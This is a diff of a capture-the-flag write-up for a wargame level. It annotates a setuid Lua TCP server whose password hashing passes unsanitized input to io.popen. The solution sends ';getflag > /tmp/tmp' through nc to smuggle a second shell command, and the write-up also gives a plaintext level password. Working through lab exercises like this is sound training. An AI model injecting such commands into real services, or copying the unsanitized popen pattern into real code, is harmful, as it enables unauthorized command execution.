@@ -7,23 +7,32 @@ Login
 > Password: s5cAJpM8ev6XHw998pRWG728z
 ```
 
-A lua script
+Tryout
+- We have a Lua script
+  - A TCP server is created and it listens on localhost port 5151
+  - It get an input, concat it to `echo` w/o sanitization
 
 ```b
 > ls -l
 -rwsr-sr-x 1 flag11 level11 668 level11.lua
+```
 
-> file level11.lua 
-level11.lua: setuid setgid a lua script, ASCII text executable
-
-> cat level11.lua 
+```b
 #!/usr/bin/env lua
 local socket = require("socket")
 local server = assert(socket.bind("127.0.0.1", 5151))
-                             🟡 localhost:5151 ^^^^
+                     🟡 a TCP server listening ^^^^
+                     for conn on localhost:5151
+
 function hash(pass)
+         ^^^^ 🟡 a function converts `pass` to sha-1 hash
+
   prog = io.popen("echo "..pass.." | sha1sum", "r")
-            ^^^^^ 🟡 prone to command injection
+            ^^^^^ 🟡  do `echo <pass> | sha1sum` and read stdout
+
+            🔵 this is prone to command injection because
+            `"echo " .. pass ..` concat unsanitized inputs
+
   data = prog:read("*all")
   prog:close()
   data = string.sub(data, 1, 40)
@@ -31,6 +40,8 @@ function hash(pass)
 while 1 do
   local client = server:accept()
   client:send("Password: ")
+               ^^^^^^^^^ 🔵 we will inject a payload here
+
   client:settimeout(60)
   local l, err = client:receive()
   if not err then
@@ -44,10 +55,12 @@ while 1 do
   end
   client:close()
 ```
-```b
-> ltrace ./level11.lua 
-ltrace: Can't open ELF file "./level11.lua"
 
+Run the script
+- we find the server is up and running
+- `nc` to it, it is the same Lua program asking for password
+
+```b
 > ./level11.lua 
 lua: ./level11.lua:3: address already in use
 stack traceback:
@@ -56,20 +69,15 @@ stack traceback:
 	[C]: ?
 ```
 
-Vulnerability: `io.popen()`
-- `popen` opens a shell run an entire command
-- var `pass` being concated w/o sanitization make it prone to injection
-
 Solution
+- Goal: design a string for `hash()` to concat to `echo`
+  - halt `echo` w/ `;` 
+  - then do what we want `gettoken > /tmp/tmp`
+  - ie. `echo ;gettoken > /tmp/tmp | sha1sum`
+  - the piping to sha1sum is discarded
+
 ```b
 > nc localhost 5151
 Password: ;getflag > /tmp/tmp
 ```
-Then lua evals it like this:
-```b
-echo ;gettoken > /tmp/tmp | sha1sum
 
-# `;` halt ends the echo
-# `| sha1sum` this part is discarded
-# all it does is redir the token to /tmp/tmp
-```
